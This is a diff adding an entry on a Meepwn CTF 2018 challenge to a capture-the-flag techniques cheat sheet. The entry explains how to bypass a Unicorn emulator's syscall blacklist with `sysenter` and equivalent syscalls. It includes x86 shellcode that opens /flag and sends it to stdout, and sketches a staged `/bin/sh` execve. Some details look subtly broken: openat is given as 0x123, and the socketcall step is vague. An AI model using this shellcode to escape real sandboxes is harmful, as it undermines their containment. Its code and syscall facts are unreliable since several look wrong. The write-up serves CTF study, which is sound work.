@@ -11,6 +11,7 @@
 - [Named Pipe mkfifo for File Size Check Bypass (Nuit du Hack 2016)](#named-pipe-mkfifo-for-file-size-check-bypass-nuit-du-hack-2016)
 - [Lua Integer Underflow via Game Logic (ASIS CTF Finals 2017)](#lua-integer-underflow-via-game-logic-asis-ctf-finals-2017)
 - [CPU Emulator Print Opcode Python eval Injection (Midnight Sun CTF 2018)](#cpu-emulator-print-opcode-python-eval-injection-midnight-sun-ctf-2018)
+- [Unicorn Emulator Syscall Blacklist Bypass via sysenter and Uncommon Syscalls (Meepwn CTF Quals 2018)](#unicorn-emulator-syscall-blacklist-bypass-via-sysenter-and-uncommon-syscalls-meepwn-ctf-quals-2018)
 
 ---
 
@@ -256,3 +257,39 @@ io.interactive()
 **Key insight:** When an emulator or interpreter uses `eval()` to process string output (e.g., for escape sequences), inject a quote to close the string literal, then chain arbitrary Python code. The `#` comment character truncates any trailing syntax. This is a classic eval injection -- the emulator trusts its own memory contents, but the attacker controls memory via normal CPU opcodes.
 
 **References:** Midnight Sun CTF 2018
+
+---
+
+### Unicorn Emulator Syscall Blacklist Bypass via sysenter and Uncommon Syscalls (Meepwn CTF Quals 2018)
+
+**Pattern:** A Unicorn-based shellcode runner hooks `UC_HOOK_INSN` for `int 0x80` and `UC_HOOK_MEM_*` to block forbidden syscall numbers (execve, read, write, mmap). The filter only covers the `int 0x80` entry and the handful of syscalls the authors thought of.
+
+**Bypass:**
+1. Use `sysenter` instead of `int 0x80` — Unicorn's `INT` hook does not fire on the fast entry path.
+2. Use functionally equivalent syscalls that are not on the blacklist:
+   - `dup3` instead of `dup2`
+   - `openat` instead of `open`
+   - `pread64` instead of `read`
+   - `sendfile` to move a file descriptor's contents straight to another fd without touching `write`
+3. Stage the payload so the final stage is `execve("/bin/sh", ...)` via `sys_socketcall` (opcode `0x66`) + crafted syscall-mode transition, if even `execve` is in the blacklist.
+
+```asm
+; Swap file from /flag to stdout without read/write
+mov eax, 0x123            ; __NR_openat
+mov ebx, -100             ; AT_FDCWD
+lea ecx, [flag_path]
+xor edx, edx
+sysenter                  ; NOT int 0x80 — bypasses Unicorn INT hook
+
+; fd is now in eax
+mov ebx, eax              ; src fd
+mov ecx, 1                ; dst fd (stdout)
+xor edx, edx              ; NULL offset
+mov esi, 0x1000           ; count
+mov eax, 0xbb             ; __NR_sendfile
+sysenter
+```
+
+**Key insight:** Instruction-level filters in Unicorn hook specific opcodes. If the filter only watches `int 0x80`, any other syscall entry (`sysenter`, `syscall`, `int 0x2e` on x86-32 test builds) slips through. Always enumerate functionally equivalent syscalls: `dup3/openat/pread64/sendfile/writev/mmap2` cover almost everything a blacklist of `execve/read/write/mmap` forgets.
+
+**References:** Meepwn CTF Quals 2018 — writeups 10415, 10428
